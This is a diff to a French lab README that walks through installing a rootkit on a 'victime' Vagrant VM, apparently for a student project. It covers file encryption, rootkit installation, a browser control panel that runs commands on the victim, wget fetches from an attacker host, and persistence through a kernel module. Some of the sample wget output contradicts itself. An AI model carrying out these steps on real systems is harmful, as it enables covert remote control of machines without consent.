@@ -119,29 +119,26 @@ vagrant ssh victime
 cd /home/vagrant/rootkit
 
 # Lancement du système de chiffrement des données
-make encodage
+sudo bash encodage.sh
 ```
 
 **Sortie attendue :**
 ```
-Script de chiffrement du répertoire courant
-==============================================
-Mot de passe généré depuis le hash de référence
-Vérification des dépendances...
-Toutes les dépendances sont installées !
-Initialisation du chiffrement EncFS...
-Système de chiffrement créé !
-Copie de tous les fichiers vers le dossier chiffré...
-Copie terminée !
-Dossier verrouillé avec succès !
-Chiffrement terminé !
+Now you will need to enter a password for your filesystem.
+You will need to remember this password, as there is absolutely
+no recovery mechanism.  However, the password can be changed
+later using encfsctl.
+
+New Encfs Password: 
+Verify Encfs Password: 
+CHIFFREMENT TERMINER
 ```
 
 ### 4.3 Installation du rootkit
 
 ```bash
 # Installation automatique du rootkit
-make install
+sudo bash install.sh
 ```
 
 **Sortie attendue :**
@@ -154,7 +151,7 @@ Configuration de la persistance...
 Installation terminee
 ```
 
-**À ce moment, vous devriez voir apparaître dans le Terminal 1 (attaquant) :**
+**À ce moment, vous devriez voir apparaître dans le navigateur de la machine hote :**
 ```
 [2025-06-15 20:26:01] ubuntu-focal (192.168.56.1) - INSTALLE ET ACTIF
 Kernel: Linux 5.4.0-216-generic | Arch: x86_64 | Port: 8005 
@@ -185,7 +182,7 @@ Tunnel SSH lancé sur le port 9000.
 
 ## Étape 7 : Accès à l'interface de contrôle depuis le premier terminal attaquant
 
-###  Ouvrir un navigateur sur la machine local
+###  Ouvrir un navigateur sur la machine hote 
 
 #### Tapez l'url suivante pour acceder a l'interface : 
 
@@ -237,10 +234,11 @@ le mot de passe est enregistre dans la session.
 1. Cliquer sur `uname -a`
 2. **Résultat attendu :**
 ```
-Linux ubuntu-focal 5.4.0-216-generic #216-Ubuntu SMP Wed Jun 9 10:50:01 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+Linux ubuntu-focal 5.4.0-216-generic #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 
 Code de retour: 0
 ```
+**Vous ouvez egalemnt executer la commande de votre choix dans le Mode Commande**
 
 ### 8.2 Test de lecture de fichiers
 
@@ -261,20 +259,24 @@ Code de retour: 0
 
 **Résultat attendu :**
 ```
-Upload via WGET: test.txt vers /tmp/test_upload.txt
+Upload via WGET: test_upload.txt vers /tmp/test_upload.txt
 
-Etape 1/2: Fichier stocké sur serveur
-URL: http://192.168.56.4:5000/download/test.txt
-
-Etape 2/2: Téléchargement via wget...
-Commande exécutée: wget -O '/tmp/test_upload.txt' 'http://192.168.56.4:5000/download/test.txt'
+Commande exécutée: wget -O '/tmp/test_upload.txt' 'http://192.168.56.4:5000/download/test_upload.txt'
 
 Résultat:
---2025-06-15 14:30:00--  http://192.168.56.4:5000/download/test.txt
-Connexion à 192.168.56.4:5000... connecté.
+--2025-06-17 19:05:55--  http://192.168.56.4:5000/download/test_upload.txt
+Connecting to 192.168.56.4:5000... connected.
 HTTP request sent, awaiting response... 200 OK
-Length: 1024 [text/plain]
-Saving to: '/tmp/test_upload.txt'
+Length: 9591 (9.4K) [application/javascript]
+Saving to: '/tmp/download_auth.js'
+
+     0K .........                                             100% 44.8M=0s
+
+2025-06-17 19:05:55 (44.8 MB/s) - '/tmp/test_upload.txt' saved [9591/9591]
+
+
+
+Code de retour: 0
 
 Upload terminé avec succès
 ```
@@ -309,10 +311,6 @@ ls | grep fichiercache
 cat lignescache
 # Affiche seulement : "cette ligne est visible"
 
-# Test 4 : Répertoires secrets protégés
-ls /var/cache/.rootkit_cache
-# ls: cannot open directory '/var/cache/.rootkit_cache': No such file or directory
-```
 
 ### 9.2 Vérifications avancées
 
@@ -321,13 +319,6 @@ ls /var/cache/.rootkit_cache
 nc localhost 8005
 # AUTH_REQUIRED (rootkit actif)
 
-# Service systemd masqué mais actif
-sudo systemctl status network-cache.service
-# Active: inactive (dead) mais ExecStart exécuté
-
-# Fichiers de persistence visibles par root seulement
-sudo cat /etc/modules-load.d/network-cache.conf
-# epirootkit
 ```
 
 ---
@@ -350,6 +341,10 @@ vagrant ssh attaquant
 # Relancement du tunnel automatique
 cd /home/vagrant/attacking_program
 bash TUNNELSSH.sh
+
+reconnection sur le navigateur de la machine hote avec les meme parametres.
+
+
 ```
 
 ### 10.3 Vérification après redémarrage
